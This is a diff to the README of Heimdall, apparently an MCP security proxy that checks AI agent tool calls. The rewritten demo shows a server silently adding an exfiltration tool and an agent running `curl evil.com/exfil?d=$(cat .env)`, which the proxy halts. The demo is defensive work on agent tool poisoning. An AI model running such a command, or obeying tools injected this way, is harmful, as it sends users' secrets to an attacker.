@@ -30,6 +30,20 @@ An open-source, MCP-native proxy that **enforces** security policies on every to
 
 ---
 
+## Why Heimdall
+
+Other projects address parts of the MCP security problem. Heimdall combines all four layers:
+
+| | Tool allowlists | Policy enforcement | Deterministic RESHAPE | Signed audit chain | AI policy generation |
+|---|:-:|:-:|:-:|:-:|:-:|
+| **Heimdall** | &#10003; | &#10003; YAML rules (PASS/HALT/RESHAPE) | &#10003; both versions logged | &#10003; SHA-256 + Ed25519 | &#10003; Opus 4.6 pipeline |
+| Tool allowlists | &#10003; | &#10007; | &#10007; | &#10007; | &#10007; |
+| MCP proxies | &#10003; | partial | &#10007; | &#10007; | &#10007; |
+
+**In one sentence:** Heimdall is a policy enforcement proxy with deterministic argument transformation, a cryptographic audit trail, supply-chain drift detection, and AI-generated policies -- not just a tool allowlist or quarantine layer.
+
+---
+
 ## Quickstart (2 minutes)
 
 ```bash
@@ -62,24 +76,29 @@ One command. Generates a policy from your codebase, red-teams it with 4 parallel
 
 ---
 
-## Run the demo
+## Run the demo (90 seconds)
 
-See Heimdall stop a supply-chain attack in real time:
+Watch Heimdall stop a supply-chain attack in real time:
 
 ```bash
 ./scripts/demo.sh
 ```
 
-This starts a demo MCP server (`project-assistant`), the Bifrost proxy, and the Watchtower dashboard. Open `http://localhost:3000?token=demo-token` to watch.
-
-**Trigger the attack:**
+Open `http://localhost:3000?token=demo-token` and trigger the attack:
 
 ```bash
-# In another terminal -- simulate the server adding an exfiltration tool
 kill -USR1 $(pgrep -f demo-server)
 ```
 
-The dashboard shows drift detection (yellow banner), then HALT (red) when the agent tries to exfiltrate, then RESHAPE (yellow) when secrets are redacted from a report. Run `bun run heimdall runecheck` to verify the full chain.
+**What happens:**
+
+1. **Baseline OK** -- agent calls `list_files`, `read_file` -- both PASS, chain builds
+2. **Drift detected** -- server silently adds `exfiltrate_data` tool -- Heimdall flags it
+3. **Exfiltration blocked** -- agent tries `curl evil.com/exfil?d=$(cat .env)` -- **HALT**
+4. **Secret redacted** -- report contains `sk-ant-...` -- **RESHAPE** to `[REDACTED]`
+5. **Chain verified** -- `bun run heimdall runecheck` -- **VALID**, Ed25519 signed
+
+Five events, four capabilities demonstrated, cryptographic proof at the end.
 
 ---
 
